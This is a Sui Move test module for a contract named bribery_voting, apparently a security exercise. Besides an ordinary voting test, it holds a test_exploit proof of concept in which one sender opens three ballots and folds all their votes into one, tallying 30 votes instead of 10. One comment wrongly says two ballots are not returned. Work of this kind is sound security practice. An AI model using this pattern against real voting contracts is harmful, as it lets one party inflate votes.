#[test_only]
module bribery_voting::bribery_voting_tests;

use sui::test_scenario::{Self as ts};
use bribery_voting::ballot::{Self, Ballot};
use bribery_voting::candidate::{Self, Candidate};
use std::debug::{print};
use std::string;

#[test]
fun test_bribery_voting() {
    let sender = @0xcafe;
    let mut s = ts::begin(sender);

    s.next_tx(sender);
    ballot::get_ballot(s.ctx());
    candidate::register(s.ctx());

    s.next_tx(sender);
    let mut candidate = s.take_shared<Candidate>();
    let mut ballot = s.take_from_sender<Ballot>();
    let mut request = ballot.request_vote();
    assert!(candidate.total_votes() == 0);
    candidate.vote(&mut request, 10);
    assert!(candidate.total_votes() == 10);
    ballot.finish_voting(request);
    assert!(ballot.voted().get(&sender) == 10);
    ts::return_shared(candidate);
    s.return_to_sender(ballot);

    s.end();
}

#[test]
fun test_exploit() {
    let sender = @0xcafe;
    let mut s = ts::begin(sender);

    // First TX: create ballots and register candidate
    s.next_tx(sender);
    ballot::get_ballot(s.ctx()); // ballot1
    ballot::get_ballot(s.ctx()); // ballot2
    ballot::get_ballot(s.ctx()); // ballot3
    candidate::register(s.ctx()); // shared Candidate

    // Second TX: vote with each request, finish into ballot1
    s.next_tx(sender);
    let mut candidate = s.take_shared<Candidate>();

    // --- Take all 3 ballots from sender
    let mut ballot1 = s.take_from_sender<Ballot>();
    let mut ballot2 = s.take_from_sender<Ballot>();
    let mut ballot3 = s.take_from_sender<Ballot>();

    // --- Request votes from all 3 ballots
    let mut req1 = ballot1.request_vote();
    let mut req2 = ballot2.request_vote();
    let mut req3 = ballot3.request_vote();

    assert!(candidate.total_votes() == 0);

    // --- Vote 10 from each request
    candidate.vote(&mut req1, 10);
    candidate.vote(&mut req2, 10);
    candidate.vote(&mut req3, 10);

    assert!(candidate.total_votes() == 30);

    // --- Finish all 3 votes into ballot1
    ballot1.finish_voting(req1);
    ballot1.finish_voting(req2);
    ballot1.finish_voting(req3);

    // Total = 30 votes from sender in ballot1
    assert!(ballot1.voted().get(&sender) == 30);

    print<string::String>(&string::utf8(b"ballot_1 get total votes:"));
    print<u64>(ballot1.voted().get(&sender));

    print<string::String>(&string::utf8(b"for candidate:"));
    print<address>(&sender);

    // Return objects
    ts::return_shared(candidate);
    s.return_to_sender(ballot1);
    s.return_to_sender(ballot2);
    s.return_to_sender(ballot3);
    // Don't return ballot2 or ballot3 since they were not modified
    
    s.end();
}
